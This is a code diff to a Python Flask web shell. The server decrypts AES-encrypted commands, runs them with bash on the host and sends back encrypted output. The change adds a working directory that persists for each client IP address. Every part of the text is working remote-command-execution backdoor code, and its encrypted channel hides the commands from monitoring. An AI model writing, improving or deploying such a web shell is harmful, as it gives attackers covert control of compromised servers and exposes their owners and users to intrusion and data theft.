@@ -2,8 +2,11 @@ import os
 import json
 import base64
 import subprocess
+import shlex
 from flask import Flask, request, jsonify, render_template
 from Crypto.Cipher import AES
+
+SHELL_QUOTE = shlex.quote
 
 app = Flask(__name__)
 
@@ -15,6 +18,8 @@ AES_KEY = bytes.fromhex(AES_KEY_HEX)
 
 SHELL = os.environ.get("WEBSHELL_SHELL", "/bin/bash")
 TIMEOUT = int(os.environ.get("WEBSHELL_TIMEOUT", "30"))
+
+sessions_cwd = {}
 
 
 def decrypt_payload(data: dict) -> str:
@@ -50,9 +55,14 @@ def exec_command():
     except Exception:
         return jsonify(encrypt_payload("ERROR: Decryption failed")), 400
 
+    sid = request.remote_addr
+    cwd = sessions_cwd.get(sid, "/")
+
+    wrapped = f'cd {SHELL_QUOTE(cwd)} && {command} ; echo "___CWD___:$(pwd)"'
+
     try:
         result = subprocess.run(
-            [SHELL, "-c", command],
+            [SHELL, "-c", wrapped],
             capture_output=True,
             text=True,
             timeout=TIMEOUT,
@@ -60,14 +70,25 @@ def exec_command():
         output = result.stdout
         if result.stderr:
             output += result.stderr
-        if not output:
+
+        lines = output.rsplit("\n", 2)
+        for i, line in enumerate(lines):
+            if line.startswith("___CWD___:"):
+                sessions_cwd[sid] = line.split(":", 1)[1]
+                lines.pop(i)
+                break
+        output = "\n".join(lines)
+
+        if not output.strip():
             output = "(no output)"
     except subprocess.TimeoutExpired:
         output = f"ERROR: Command timed out after {TIMEOUT}s"
     except Exception as e:
         output = f"ERROR: {str(e)}"
 
-    return jsonify(encrypt_payload(output))
+    current_cwd = sessions_cwd.get(sid, "/")
+    resp_text = f"___CWD_RESP___:{current_cwd}\n{output}"
+    return jsonify(encrypt_payload(resp_text))
 
 
 if __name__ == "__main__":
